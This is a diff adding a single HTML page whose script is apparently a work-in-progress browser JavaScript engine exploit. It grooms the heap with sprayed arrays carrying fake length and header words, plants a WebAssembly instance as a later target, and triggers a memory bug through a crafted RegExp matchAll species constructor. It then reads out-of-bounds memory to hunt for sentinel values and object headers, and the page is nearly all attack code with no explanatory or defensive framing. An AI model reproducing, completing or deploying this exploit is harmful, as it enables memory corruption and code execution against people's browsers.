@@ -1,0 +1,81 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P26</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
+const PINS=[0x1080011,0x1100011];
+const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
+const objB=new Array(0x8000);for(let i=0;i<objB.length;i++)objB[i]=null;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[0]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){
+  const pin=PINS[r%2];
+  const c1=w2f(pin,MAXS);
+  for(let i=0;i<12;i++){
+    const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
+    for(let j=1;j<a.length;j+=2)a[j]=c1;
+    sk.push(a);
+  }
+}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  log("M0: "+f2i(m[0]).toString(16));
+  
+  // Test if next page (m[0x8000]) is accessible
+  let pg2ok=false;
+  try{const v=f2i(m[0x8000]);log("PG2_0: "+v.toString(16));pg2ok=true;}catch(e){log("PG2: CRASH");}
+  
+  if(pg2ok){
+    // Search page 2 for pinnedDoubles sentinel (10.125)
+    const SENTINEL=0x4024400000000000n;
+    let found=-1;
+    for(let k=0x8000;k<0xFFF0;k++){
+      try{
+        if(f2i(m[k])===SENTINEL){found=k;break;}
+      }catch(e){log("PG2_ERR@"+k.toString(16));break;}
+    }
+    if(found>=0){
+      log("PD@"+found.toString(16));
+      // Verify dblA[1] = 10.126
+      log("PD1: "+m[found+1]);
+    }else{
+      log("PD_NOT_PG2");
+    }
+    // Also search for header in page 2
+    const tgt1=0x7fdffffe01080011n;
+    const tgt2=0x7fdffffe01100011n;
+    let hdr=-1;
+    for(let k=0x8000;k<0x8020;k++){
+      try{
+        const v=f2i(m[k]);
+        if(v===tgt1||v===tgt2){hdr=k;break;}
+      }catch(e){break;}
+    }
+    log("HDR2: "+(hdr>=0?hdr.toString(16):"NO"));
+  }
+  log("W: "+wasmI.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
